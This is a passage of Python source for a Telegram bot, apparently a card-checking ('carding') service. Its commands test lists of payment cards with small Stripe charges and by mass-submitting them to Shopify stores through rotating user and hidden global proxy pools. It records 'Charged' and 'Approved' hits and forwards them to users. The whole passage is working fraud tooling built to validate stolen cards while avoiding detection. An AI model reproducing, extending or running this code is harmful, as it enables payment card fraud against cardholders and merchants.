        event.chat_id,
        fake_live,
        'Approved',
        username,
        origin_user_id=event.sender_id,
        user_entity=user,
        check_time='1.23s',
    )



async def _append_global_proxies(proxies) -> int:
    existing = set(get_file_lines(GLOBAL_PROXY_FILE))
    added = 0
    async with aiofiles.open(GLOBAL_PROXY_FILE, 'a', encoding='utf-8') as f:
        for px in proxies:
            if px and px not in existing:
                await f.write(f"{px}\n")
                existing.add(px)
                added += 1
    return added


@bot.on(events.NewMessage(pattern=r'^\.gpx(\s|$)'))
async def gpx_global_proxy_cmd(event):
    """Hidden owner-only — global proxy pool + silent user fallback toggle."""
    if not is_owner(event.sender_id):
        return

    text = (event.message.text or '').strip()
    parts = text.split()
    sub = parts[1].lower() if len(parts) > 1 else ''

    if sub in ('on', 'enable', '1'):
        set_global_proxy_fallback_enabled(True)
        n = len(load_global_proxies())
        await event.reply(
            premium_emoji(f"✅ Global proxy fallback <b>ON</b>\n📦 Pool: <b>{n}</b> valid proxies"),
            parse_mode='html',
        )
        return

    if sub in ('off', 'disable', '0'):
        set_global_proxy_fallback_enabled(False)
        await event.reply(premium_emoji("✅ Global proxy fallback <b>OFF</b>"), parse_mode='html')
        return

    if sub == 'clear':
        async with aiofiles.open(GLOBAL_PROXY_FILE, 'w', encoding='utf-8') as f:
            await f.write('')
        await event.reply(premium_emoji("✅ Global proxy pool cleared."), parse_mode='html')
        return

    if sub == 'add' or event.is_reply:
        raw_lines = []
        if event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.file and str(getattr(reply_msg.file, 'name', '') or '').endswith('.txt'):
                if _reject_oversized_upload(reply_msg.file):
                    await event.reply(premium_emoji("❌ Could not process this file."), parse_mode='html')
                    return
                file_bytes = await reply_msg.download_media(bytes)
                content = file_bytes.decode('utf-8', errors='ignore')
                raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
            elif sub != 'add':
                await event.reply(
                    premium_emoji("❌ Reply to a <b>.txt</b> file or use <code>.gpx add host:port:user:pass</code>"),
                    parse_mode='html',
                )
                return
        if sub == 'add':
            if ' ' in text.split('\n')[0]:
                first = text.split('\n')[0].split(' ', 2)
                inline = first[2].split() if len(first) > 2 else []
                newline = [ln.strip() for ln in text.split('\n')[1:] if ln.strip()]
                raw_lines.extend(inline + newline)
            else:
                raw_lines.extend([ln.strip() for ln in text.split('\n')[1:] if ln.strip()])

        if not raw_lines:
            await event.reply(
                premium_emoji(
                    "❌ No proxies provided.\n\n"
                    "<code>.gpx add host:port:user:pass</code>\n"
                    "Or reply to a <b>.txt</b> with <code>.gpx</code>"
                ),
                parse_mode='html',
            )
            return

        # Smart extract & normalize proxies from messy input
        valid, invalid = _extract_proxies_from_lines(raw_lines)
        if not valid:
            await event.reply(premium_emoji(f"❌ No valid-format proxies ({invalid} rejected)."), parse_mode='html')
            return

        added = await _append_global_proxies(valid)
        dupes = len(valid) - added
        msg = f"✅ Added <b>{added}</b> to global pool"
        if dupes:
            msg += f" ({dupes} duplicate(s) skipped)"
        if invalid:
            msg += f"\n❌ {invalid} invalid-format rejected"
        msg += f"\n📦 Total valid: <b>{len(load_global_proxies())}</b>"
        await event.reply(premium_emoji(msg), parse_mode='html')
        return

    enabled = is_global_proxy_fallback_enabled()
    n = len(load_global_proxies())
    state = "ON ✅" if enabled else "OFF ❌"
    await event.reply(
        premium_emoji(
            f"<b>Global Proxy Fallback</b>: {state}\n"
            f"📦 Pool: <b>{n}</b> valid proxies\n\n"
            f"<code>.gpx on</code> / <code>.gpx off</code>\n"
            f"<code>.gpx add host:port:user:pass</code>\n"
            f"Reply <b>.txt</b> with <code>.gpx</code>\n"
            f"<code>.gpx clear</code>"
        ),
        parse_mode='html',
    )


@bot.on(events.NewMessage(pattern=r'^/st(\s|$)'))
async def stripe_cc_check(event):
    """Stripe $1 charge gate — free, no proxy/sites, 1 card at a time per user."""
    user_id = event.sender_id
    target_chat_id = event.chat_id or user_id

    if user_id in active_st_users:
        await event.reply(
            premium_emoji(
                "⏳ <b>Stripe check already running.</b>\n\n"
                "Wait for it to finish before sending another <code>/st</code>."
            ),
            parse_mode='html',
        )
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    cc_input = event.message.text.split(' ', 1)
    text_source = ""
    if len(cc_input) >= 2 and cc_input[1].strip():
        text_source = cc_input[1].strip()
    elif event.is_reply:
        replied = await event.get_reply_message()
        if replied and replied.message:
            text_source = replied.message

    if not text_source:
        await event.reply(
            premium_emoji(
                "❌ Usage: <code>/st card|mm|yy|cvv</code>\n"
                "Or reply to a message containing a CC with <code>/st</code>"
            ),
            parse_mode='html',
        )
        return

    cards = extract_cc(text_source)
    if not cards:
        await event.reply(
            premium_emoji("❌ Invalid CC format. Use: <code>/st card|mm|yy|cvv</code>"),
            parse_mode='html',
        )
        return
    card = cards[0]
    active_st_users.add(user_id)
    status_msg = await event.reply(
        premium_emoji(
            f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄Ｒ ⚡️\n\n"
            f"💳 CC : <code>{card}</code>\n"
            f"Checking… (Stripe $1 Gate)"
        ),
        parse_mode='html',
    )

    try:
        result = await check_stripe(card)
        try:
            brand, bin_type, level, bank, country, flag = await asyncio.wait_for(
                get_bin_info(card.split('|')[0]), timeout=4
            )
        except Exception:
            brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''

        await safe_edit(
            status_msg,
            premium_emoji(format_stripe_result_ui(result, brand, bin_type, level, bank, country, flag)),
            force=True, user_id=target_chat_id, parse_mode='html',
        )

        if result.get('status') in ('Charged', 'Approved') and not is_otp_result(result):
            if result.get('status') == 'Charged':
                _log_charge_sync(result.get('card', ''), result.get('gateway', 'Unknown'), result.get('price', '-'), result.get('message', ''))
            try:
                await send_realtime_hit(
                    target_chat_id, result, result['status'], username,
                    origin_user_id=user_id, skip_chat=True,
                )
            except Exception:
                pass
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Error checking card: {e}"), force=True, user_id=target_chat_id, parse_mode='html')
    finally:
        active_st_users.discard(user_id)


@bot.on(events.NewMessage(pattern=r'^/bin(\s|$)'))
async def bin_lookup_command(event):
    """BIN lookup via Juspay — free, no limits, no channel join required."""
    cc_input = event.message.text.split(' ', 1)
    text_source = ""
    if len(cc_input) >= 2 and cc_input[1].strip():
        text_source = cc_input[1].strip()
    elif event.is_reply:
        replied = await event.get_reply_message()
        if replied and replied.message:
            text_source = replied.message

    if not text_source:
        await event.reply(
            premium_emoji(
                "❌ <b>Usage:</b>\n"
                "<code>/bin 444488</code>\n"
                "Or reply to a message with <code>/bin</code>"
            ),
            parse_mode='html',
        )
        return

    bin_number = extract_bin_from_text(text_source)
    if not bin_number or len(bin_number) < 6:
        await event.reply(
            premium_emoji("❌ Could not find a valid 6-digit BIN in that message."),
            parse_mode='html',
        )
        return

    try:
        data = await fetch_bin_data(bin_number)
        if not data:
            await event.reply(
                f'❌ <b>BIN not found</b>\n\n<code>{escape(bin_number)}</code> — no data from lookup API.',
                parse_mode='html',
            )
            return
        await event.reply(
            premium_emoji(format_bin_lookup_ui(bin_number, data)),
            parse_mode='html',
        )
    except Exception as e:
        await event.reply(
            f'❌ BIN lookup failed: {escape(str(e))}',
            parse_mode='html',
        )


@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"💱 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await safe_edit(status_msg, premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), force=True, user_id=user_id, parse_mode='html')
        else:
            await safe_edit(status_msg, premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), force=True, user_id=user_id, parse_mode='html')

    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Error checking proxy: {e}"), force=True, user_id=user_id, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    """Remove all proxies from proxy.txt"""
    user_id = event.sender_id


    current_proxies = load_user_proxies(user_id)
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ <b>Your proxy list is already empty.</b>"), parse_mode='html')
        return

    # Send backup file to user
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(
                f"📋 <b>Backup Created!</b>\n\n"
                f"Sending backup of {count} proxies before clearing..."
            ),
            file=backup_filename,
            parse_mode='html'
        )

        safe_delete(backup_filename)

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    # Clear user's proxy file
    async with aiofiles.open(user_proxy_file(user_id), 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} of your proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    """Get a user's own proxies"""
    user_id = event.sender_id

    # Auto-clean any malformed entries lurking from older bot versions
    await purge_invalid_user_proxies(user_id)
    current_proxies = load_user_proxies(user_id)

    if not current_proxies:
        await event.reply(premium_emoji("❌ <b>You have no proxies saved.</b>\n\nAdd some with <code>/addproxy</code>."), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        safe_delete(filename)

@bot.on(events.NewMessage(pattern=r'^/addproxy(\s|$)'))
async def add_proxy_command(event):
    """Command to add proxies to proxy.txt — inline or .txt file reply"""
    user_id = event.sender_id

    try:
        proxies_to_add = []

        # Check if replying to a .txt file
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg.file and reply_msg.file.name and reply_msg.file.name.endswith('.txt'):
                if _reject_oversized_upload(reply_msg.file):
                    await event.reply(premium_emoji("❌ Could not process this file."), parse_mode='html')
                    return
                file_bytes = await reply_msg.download_media(bytes)
                content = file_bytes.decode('utf-8', errors='ignore')
                raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
            else:
                await event.reply(premium_emoji("❌ Please reply to a <b>.txt</b> file containing proxies."), parse_mode='html')
                return
        else:
            # Inline: /addproxy proxy1 proxy2... (space separated on same line)
            # OR /addproxy\nproxy1\nproxy2 (newline separated)
            text = event.message.text
            # Remove the command part
            if ' ' in text.split('\n')[0]:
                # Same line: /addproxy proxy1 proxy2
                first_line_parts = text.split('\n')[0].split(' ', 1)
                rest_lines = text.split('\n')[1:]
                inline_proxies = first_line_parts[1].split() if len(first_line_parts) > 1 else []
                newline_proxies = [line.strip() for line in rest_lines if line.strip()]
                raw_lines = inline_proxies + newline_proxies
            else:
                # Only newline format: /addproxy\nproxy1\nproxy2
                args = text.split('\n')
                raw_lines = [line.strip() for line in args[1:] if line.strip()]

        if not raw_lines:
            await event.reply(premium_emoji(
                "❌ <b>No proxies provided.</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/addproxy\nip:port:user:pass\nip:port:user:pass</code>\n\n"
                "OR reply to a <b>.txt</b> file with <code>/addproxy</code>"
            ), parse_mode='html')
            return

        # Smart extract & normalize proxies from messy input
        proxies_to_add, invalid_count = _extract_proxies_from_lines(raw_lines)

        current_proxies = load_user_proxies(user_id)
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]
        dupes = len(proxies_to_add) - len(new_proxies)

        if not new_proxies:
            extra = f"\n❌ {invalid_count} invalid-format entry(ies) rejected." if invalid_count else ""
            await event.reply(premium_emoji(f"⚠️ All provided proxies already exist in your list.{extra}"), parse_mode='html')
            return

        status_msg = await event.reply(
            premium_emoji(
                f"🔄 <b>Checking {len(new_proxies)} proxies...</b>\n\n"
                "Only proxies marked <b>live</b>will be added."
            ),
            parse_mode='html'
        )

        alive_proxies = []
        dead_proxies = []
        batch_size = 20
        for i in range(0, len(new_proxies), batch_size):
            batch = new_proxies[i:i + batch_size]
            results = await asyncio.gather(*[test_proxy(p) for p in batch])
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            checked = len(alive_proxies) + len(dead_proxies)
            is_last = (i + batch_size) >= len(new_proxies)
            await throttled_edit(
                status_msg,
                premium_emoji(
                    f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
                    f"🔄 <b>Checking proxies...</b>\n\n"
                    f"📊 <b>Checked:</b> {checked}/{len(new_proxies)}\n"
                    f"✅ <b>Live:</b> {len(alive_proxies)}\n"
                    f"❌ <b>Dead:</b> {len(dead_proxies)}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                ),
                force=is_last,
                user_id=user_id,
                parse_mode='html'
            )

        if alive_proxies:
            async with aiofiles.open(user_proxy_file(user_id), 'a', encoding='utf-8') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")

        msg = f"✅ <b>Added {len(alive_proxies)} live proxies to your account!</b>"
        if dead_proxies:
            msg += f"\n❌ {len(dead_proxies)} dead proxy(ies) skipped."
        if invalid_count:
            msg += f"\n❌ {invalid_count} invalid-format entry(ies) rejected."
        if dupes:
            msg += f"\n⚠️ {dupes} duplicate(s) skipped."
        msg += f"\n\n📋 Your total proxies now: <b>{len(current_proxies) + len(alive_proxies)}</b>"

        await throttled_edit(status_msg, premium_emoji(msg), force=True, user_id=user_id, parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    """Command to remove a site from sites.txt by URL, index number, or all (owner only)"""
    user_id = event.sender_id
    if not is_owner(user_id):
        await event.reply(premium_emoji("❌ <b>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱</b>\n\n👑 𝗢𝗻𝗹𝘆 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."), parse_mode='html')
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2 or not args[1].strip():
            await event.reply(premium_emoji(
                "❌ <b>Usage:</b>\n"
                "<code>/rm https://site.com</code> — Remove by URL\n"
                "<code>/rm 40</code> — Remove site #40 by number\n"
                "<code>/rm all</code> — Clear ALL sites (with backup)"
            ), parse_mode='html')
            return

        arg = args[1].strip()
        current_sites = load_sites()

        # /rm all — clear all sites with backup
        if arg.lower() == 'all':
            if not current_sites:
                await event.reply(premium_emoji("❌ `sites.txt` is already empty."), parse_mode='html')
                return

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_filename = f"sites_backup_{user_id}_{timestamp}.txt"
            async with aiofiles.open(backup_filename, 'w', encoding='utf-8') as f:
                for site in current_sites:
                    await f.write(f"{site}\n")

            await event.reply(
                premium_emoji(f"🗑 <b>Backup of {len(current_sites)} sites before clearing:</b>"),
                file=backup_filename,
                parse_mode='html'
            )

            async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
                await f.write("")

            await event.reply(premium_emoji(f"✅ **Cleared all {len(current_sites)} sites!**\n\n`sites.txt` is now empty."), parse_mode='html')
            return

        # /rm 40 — remove by index number
        if arg.isdigit():
            index = int(arg) - 1
            if index < 0 or index >= len(current_sites):
                await event.reply(premium_emoji(f"❌ Invalid number. There are only {len(current_sites)} sites."), parse_mode='html')
                return

            removed_site = current_sites[index]
            new_sites = [s for i, s in enumerate(current_sites) if i != index]

            async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
                for site in new_sites:
                    await f.write(f"{site}\n")

            await event.reply(premium_emoji(f"✅ **Site #{int(arg)} Removed!**\n\n`{removed_site}`"), parse_mode='html')
            return

        # /rm https://site.com — remove by URL
        if arg not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{arg}`"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != arg]
        async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ **Site Removed!**\n\n`{arg}` deleted from `sites.txt`."), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error removing site: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsite'))
async def add_site_command(event):
    """Check new sites first (same as /site), then append alive ones to global_sites.json."""
    user_id = event.sender_id
    if not is_owner(user_id):
        await event.reply(premium_emoji("❌ <b>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱</b>\n\n👑 𝗢𝗻𝗹𝘆 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."), parse_mode='html')
        return

    try:
        sites_to_add = []

        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg.file and reply_msg.file.name and reply_msg.file.name.endswith('.txt'):
                file_bytes = await reply_msg.download_media(bytes)
                content = file_bytes.decode('utf-8', errors='ignore')
                sites_to_add = [line.strip() for line in content.splitlines() if line.strip()]
            else:
                await event.reply(premium_emoji("❌ Please reply to a <b>.txt</b> file containing sites."), parse_mode='html')
                return
        else:
            text = event.message.text
            if ' ' in text.split('\n')[0]:
                first_line_parts = text.split('\n')[0].split(' ', 1)
                rest_lines = text.split('\n')[1:]
                inline_sites = first_line_parts[1].split() if len(first_line_parts) > 1 else []
                newline_sites = [line.strip() for line in rest_lines if line.strip()]
                sites_to_add = inline_sites + newline_sites
            else:
                lines = text.split('\n')
                sites_to_add = [line.strip() for line in lines[1:] if line.strip()]

        if not sites_to_add:
            await event.reply(premium_emoji(
                "❌ No sites provided.\n\n"
                "<b>Usage:</b>\n"
                "<code>/addsite\nhttps://site1.myshopify.com\nhttps://site2.myshopify.com</code>\n\n"
                "OR reply to a <b>.txt</b> file with <code>/addsite</code>\n\n"
                "Sites are <b>checked first</b> (Shopify gateway, $0.01–$20, live decline keywords) — only alive sites are saved."
            ), parse_mode='html')
            return

        current_sites = load_global_sites()
        new_urls, already_exists, self_dupes, invalid = partition_new_site_urls(sites_to_add, current_sites)

        if not new_urls:
            msg = "⚠️ <b>No new sites to check.</b>\n\n"
            if already_exists:
                msg += f"📋 <b>{already_exists}</b> already in <code>global_sites.json</code>\n"
            if self_dupes:
                msg += f"🔁 <b>{self_dupes}</b> duplicate(s) in your list\n"
            if invalid:
                msg += f"⚠️ <b>{invalid}</b> invalid/empty line(s)"
            await event.reply(premium_emoji(msg.strip()), parse_mode='html')
            return

        proxies = load_user_proxies(user_id)
        if not proxies:
            await event.reply(
                premium_emoji("❌ <b>You (owner) have no proxies saved.</b>\n\nAdd some with <code>/addproxy</code> before adding sites."),
                parse_mode='html',
            )
            return

        status_msg = await event.reply(
            premium_emoji(
                f"<b>⚡💳 ꜱ ɪ ᴛ ᴇ ⇢ ᴄ ʜ ᴇ ᴄ ᴋ 💳⚡</b>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"<b>🔥Checking {len(new_urls)} sites...</b>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>"
            ),
            parse_mode='html',
        )

        alive_sites, dead_sites = await run_site_check_batches(new_urls, user_id, status_msg)
        if alive_sites is None:
            await throttled_edit(
                status_msg,
                premium_emoji("❌ <b>No proxies available.</b> Add proxies with <code>/addproxy</code>."),
                force=True, user_id=user_id, parse_mode='html',
            )
            return

        new_entries = [site_result_to_entry(res) for res in alive_sites]
        if new_entries:
            save_global_sites(current_sites + new_entries)

        extra = ''
        if already_exists:
            extra += f"<blockquote>📋 <b>{already_exists}</b> already in DB — skipped</blockquote>\n"
        if self_dupes:
            extra += f"<blockquote>🔁 <b>{self_dupes}</b> duplicate(s) in your list — skipped</blockquote>\n"
        if invalid:
            extra += f"<blockquote>⚠️ <b>{invalid}</b> invalid line(s) — skipped</blockquote>\n"
        if new_entries:
            extra += (
                f"<blockquote>📦 <b>Added to global pool:</b> {len(new_entries)} "
                f"(total: {len(current_sites) + len(new_entries)})</blockquote>\n"
            )

        await deliver_site_check_results(
            user_id, status_msg, new_urls, alive_sites, dead_sites, extra_summary=extra,
        )

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding sites: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/chk(\s|$)'))
async def check_command(event):
    """Main check command"""
    try:
        await _check_command_impl(event)
    except FloodWaitError as e:
        print(f"[FloodWait] /chk unhandled: wait {e.seconds}s")
        try:
            await event.reply(
                premium_emoji(
                    f"⏳ <b>Telegram rate limit.</b> Wait ~{max(1, e.seconds // 60)} min and try again."
                ),
                parse_mode='html',
            )
        except Exception:
            pass
    except Exception as e:
        print(f"[chk] unhandled error: {e}")


async def _resolve_chk_cards(event):
    """Cards for /chk: inline text, reply-to-text, or reply-to-.txt (same extract_cc as /sh)."""
    text = event.message.text or ''
    lines = text.split('\n')
    first_line = lines[0].strip()

    inline_chunks = []
    if ' ' in first_line:
        chunk = first_line.split(' ', 1)[1].strip()
        if chunk:
            inline_chunks.append(chunk)
    if len(lines) > 1:
        tail = '\n'.join(lines[1:]).strip()
        if tail:
            inline_chunks.append(tail)

    if inline_chunks:
        cards = extract_cc('\n'.join(inline_chunks))
        if cards:
            return cards, None, 'inline'

    if event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        if not reply_msg:
            return [], "Could not read replied message.", None

        if reply_msg.file and getattr(reply_msg.file, 'name', '') and str(reply_msg.file.name).endswith('.txt'):
            if _reject_oversized_upload(reply_msg.file):
                return [], "❌ Could not process this file.", None

            file_path = None
            for _attempt in range(3):
                try:
                    file_path = await reply_msg.download_media()
                    if file_path:
                        break
                except Exception as _dl_err:
                    print(f"[download_media] attempt {_attempt+1} failed: {_dl_err}")
                    await asyncio.sleep(2)

            if not file_path:
                return [], "File download failed. Please re-send the file and try again.", None

            try:
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
            finally:
                try:
                    if file_path and os.path.exists(file_path):
                        os.remove(file_path)
                except Exception:
                    pass

            cards = extract_cc(content)
            if cards:
                return cards, None, 'file'
            return [], "No valid cards found in file.", None

        reply_text = (getattr(reply_msg, 'message', None) or getattr(reply_msg, 'text', None) or '').strip()
        if reply_text:
            cards = extract_cc(reply_text)
            if cards:
                return cards, None, 'reply'
            return [], "No valid cards in the replied message.", None

        return [], "Reply must be a <b>.txt</b> file or a message containing cards.", None

    return [], (
        "No cards found.\n\n"
        "<b>Usage:</b>\n"
        "• Paste cards after <code>/chk</code>\n"
        "• <code>/chk</code> then cards on the next lines\n"
        "• Reply to a message with cards using <code>/chk</code>\n"
        "• Reply to a <b>.txt</b> file with <code>/chk</code>"
    ), None


async def _check_command_impl(event):
    user_id = event.sender_id
    target_chat_id = event.chat_id or user_id

    sender = None
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    # Per-user single-run limit
    if user_id in active_chk_users:
        await event.reply(premium_emoji("⚠️ <b>You already have a /chk running.</b>\n\nUse the <b>Stop</b> inline button on your running check to cancel it before starting another."), parse_mode='html')
        return

    tier_name, user_limit = get_user_tier_display(user_id)

    global_sites = load_global_sites()
    if not global_sites:
        await event.reply(premium_emoji("❌ No global sites available. Owner: add sites with /addsite."), parse_mode='html')
        return
    if not get_checker_manager().total_workers():
        await event.reply(premium_emoji("❌ No checker API enabled. Owner: <code>/apiconfig</code>"), parse_mode='html')
        return
    if not get_check_proxies(user_id):
        await event.reply(premium_emoji("❌ <b>No valid proxies found in your account.</b>\n\nAdd your own proxies with <code>/addproxy</code> first."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🫆 𝗔𝗻𝗮𝗹𝘆𝘇𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 ....."), parse_mode='html')

    cards, err_msg, source = await _resolve_chk_cards(event)
    if err_msg:
        await safe_edit(
            status_msg,
            premium_emoji(err_msg),
            force=True, user_id=target_chat_id, parse_mode='html',
        )
        return

    limit_note = None
    original_count = len(cards)
    if original_count > user_limit:
        src_label = 'File' if source == 'file' else 'List'
        limit_note = (
            f"🫦 {src_label} has {original_count} cards — {tier_name} limit {user_limit:,}. "
            f"Checking first {user_limit:,}."
        )
        cards = cards[:user_limit]

    total_cards = len(cards)
    PENDING_CHK[status_msg.id] = {
        'user_id': user_id,
        'cards': cards,
        'username': username,
        'target_chat_id': target_chat_id,
        'sender': sender,
    }
    prompt, buttons = build_chk_range_prompt(total_cards, global_sites, status_msg.id, limit_note=limit_note, user_id=user_id)
    await safe_edit(status_msg, prompt, force=True, user_id=target_chat_id, buttons=buttons)
    return


@bot.on(events.CallbackQuery(pattern=rb'chk_range:(.*):(.*):(.*)'))
async def chk_range_callback(event):
    try:
        range_key = event.pattern_match.group(1).decode('utf-8')
        origin_msg_id = int(event.pattern_match.group(2).decode('utf-8'))
        allowed_user_id = int(event.pattern_match.group(3).decode('utf-8'))
    except Exception:
        return await event.answer("Invalid selection", alert=True)

    user_id = event.sender_id

    # Only the user who sent /chk can interact
    if user_id != allowed_user_id:
        return await event.answer("⛔ This isn't your session.", alert=False)

    # Check BEFORE popping so wrong clicks don't destroy the session
    pending = PENDING_CHK.get(origin_msg_id)
    if not pending or pending.get('user_id') != user_id:
        return await event.answer("Session expired. Send /chk again with your cards.", alert=True)

    # Now safe to pop
    PENDING_CHK.pop(origin_msg_id, None)

    if user_id in active_chk_users:
        return await event.answer("You already have a /chk running.", alert=True)

    global_sites = load_global_sites()
    selected = filter_sites_by_price_range(global_sites, range_key)
    chk_sites = site_urls_from_entries(selected)
    if not chk_sites:
        return await event.answer("No sites in that price range.", alert=True)

    range_map = {'1_5': '$1 - $5', '1_10': '$1 - $10', 'ALL': 'All Sites'}
    range_label = range_map.get(range_key, range_key)

    header = (
        f"[❅] {BOT_BRAND} | Mass Check Started\n"
        f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        f"[↯] Source: Global Sites\n"
        f"[↯] Price Range: {range_label}\n"
    )
    status_msg = await event.get_message()
    await event.answer()  # Answer callback IMMEDIATELY — Telegram has a 30s deadline
    await safe_edit(status_msg, header, force=True, user_id=user_id)

    await _run_chk_session(
        event,
        user_id,
        pending['target_chat_id'],
        pending['username'],
        pending['cards'],
        chk_sites,
        status_msg,
        range_label=range_label,
        user_entity=pending.get('sender'),
    )


async def _run_chk_session(event, user_id, target_chat_id, username, cards, chk_sites, status_msg, range_label=None, user_entity=None):
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False, 'range_label': range_label}
    chk_session_by_user[user_id] = session_key
    active_chk_users.add(user_id)

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': len(cards),
        'checked': 0,
        'start_time': time.time(),
        'range_label': range_label,
        'chk_sites': list(chk_sites),
    }

    # $1-$5: no banning | $1-$10: 50% cap | All Sites: unlimited banning
    if range_label == '$1 - $5':
        session_bad_sites = None
    elif range_label == '$1 - $10':
        session_bad_sites = _CappedBanSet(max(1, len(chk_sites) // 2))
    else:
        session_bad_sites = set()
    max_retries = 5

    progress_lock = asyncio.Lock()
    try:
        last_update_time = [time.time()]
        chk_proxies = get_check_proxies(user_id)
        if not chk_sites or not chk_proxies:
            await safe_edit(
                status_msg,
                premium_emoji('❌ Sites or proxies unavailable.'),
                force=True, user_id=target_chat_id, parse_mode='html',
            )
            return

        async def run_card(card):
            # honor stop
            if session_key not in active_sessions:
                return
            # honor pause
            while active_sessions.get(session_key, {}).get('paused', False):
                await asyncio.sleep(1)
                if session_key not in active_sessions:
                    return

            if session_key not in active_sessions:
                return

            try:
                res = await asyncio.wait_for(
                    check_card_with_retry(
                        card, chk_sites, chk_proxies, max_retries=max_retries,
                        bad_sites=session_bad_sites, bypass_user_pool=False,
                    ),
                    timeout=90,
                )
            except asyncio.TimeoutError:
                res = {'status': 'Dead', 'response': 'Timeout — check took too long', 'card': card}

            stopped = session_key not in active_sessions
            is_hit = res['status'] == 'Charged' or is_live_hit_result(res)
            if stopped and not is_hit:
                return

            # In-flight hits still count after stop; dead cards after stop are skipped.
            all_results['checked'] += 1

            if res['status'] == 'Charged':
                all_results['charged'].append(res)
                _log_charge_sync(res.get('card', ''), res.get('gateway', 'Unknown'), res.get('price', '-'), res.get('message', ''))
                try:
                    await send_realtime_hit(
                        target_chat_id, res, 'Charged', username,
